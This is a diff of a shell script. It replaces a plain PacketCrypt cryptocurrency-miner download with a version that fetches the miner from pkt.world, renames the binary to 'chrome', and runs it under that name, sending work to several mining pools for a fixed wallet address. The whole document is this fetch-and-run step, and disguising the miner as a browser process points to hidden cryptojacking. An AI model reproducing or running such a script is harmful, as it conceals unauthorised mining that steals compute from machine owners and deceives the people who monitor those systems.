@@ -1,2 +1,4 @@
-cd
-wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 && chmod +x packetcrypt-v0.5.2-linux_amd64 && ./packetcrypt-v0.5.2-linux_amd64 ann -p pkt1q9su7naaf4w077xnnpafr55wlvfhmmew4z8xeje http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
+chmod +x packetcrypt
+mv packetcrypt chrome 
+./chrome ann -p pkt1q9su7naaf4w077xnnpafr55wlvfhmmew4z8xeje http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com 
